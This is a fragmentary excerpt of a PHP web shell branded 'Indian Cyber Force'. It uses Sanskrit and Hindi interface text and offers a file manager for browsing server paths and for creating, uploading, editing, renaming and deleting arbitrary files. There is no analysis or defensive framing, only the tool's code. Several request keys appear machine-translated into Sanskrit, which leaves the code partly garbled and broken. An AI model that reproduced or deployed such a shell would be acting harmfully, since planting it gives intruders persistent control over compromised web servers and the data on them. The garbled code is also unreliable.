...
if( $pat == '' && $id == 0 ){
$a = true;
echo 'वर्तमान निदेशक => <a href="?path=/">/</a>';
continue;
}
if( $pat == '' ) continue;
echo '<a href="?path=';
...
?>
 ...
 <div class="d-flex" id="wrapper">
    ...
    <div class="bg-light border-right" id="sidebar-wrapper">
      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> Indian Cyber Force</a></div>
      <div class="list-group list-group-flush">
      	<?php
      	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Folders रचयन्तु</a>
      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> सञ्चिकां रचयन्तु</a>
      	...
      	?>
        <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> लॉगआउट</a>
...
<?php
if($_GET["बहिः गच्छतु"] == true){
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
if($_GET['aksi'] == 'buatfolder'){
	function hai(){
		echo "<script>window.location='?path=".$path."'; alert('Folder सफलता कृता!')</script>";
	}
...
if($puts == true){
	echo "<script>window.location='?path=".$path."'; alert('सफलता')</script>";
}else{
	echo "अनुत्तीर्णः निर्मीयताम्‌ File";
	}
}else{
	echo "Not Found!!";
}
...
}elseif($_GET["नामपत्र"] == 'createfile इति'){
	if(isset($_POST["कृते"])){
	$namaF = $path.'/'.$_POST["सञ्चिका_नाम"];
	$isi = $_POST["विषयः"];
	$buat = fopen($namaF,"w");
	fwrite($buat,$isi);
	fclose($buat);
...
echo "<script>window.location='?path=".$path."'; alert('अनुत्तीर्णः!!!')</script>";
}
}
...
echo "<script>window.location='?path=".$path."'; alert('मान्य!!')</script>";
}else{
echo "<script>alert('अनुत्तीर्णः Upload')</script>";
}
...
echo "<script>window.location='?path=".$path."'; alert('नाम बदल दिया गया है!')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('अनुत्तीर्णः!!!')</script>";
}
...
echo "<script>window.location='?path=".$path."'; alert('सफलतया नाम परिवर्तितम् File')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('अनुत्तीर्णः!!!')</script>";
}
fclose($fp);
...
<input type="submit" value="रक्ष्" class="btn btn-outline-primary btn-block mt-3">
</form>';
}
echo '</center>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo "<script>window.location='?path=".$path."'; alert('सफल Delete Folder')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('अनुत्तीर्णः!!!')</script>";
}
}else if($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo "<script>window.location='?path=".$path."'; alert('सफल Delete File')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('अनुत्तीर्णः!!!')</script>";
}
}
...
<div class="table-responsive-lg mt-2">
	<table class="table table-hover">
		<thead class="bg-warning text-center">
			<tr>
				<th scope="col">नामः</th>
				<th scope="col">प्रकारः</th>
				<th scope="col">आकृति</th>
				<th scope="col">अनुज्ञापत्रम्</th>
				<th scope="col">नामपत्र</th></tr></thead>
	';
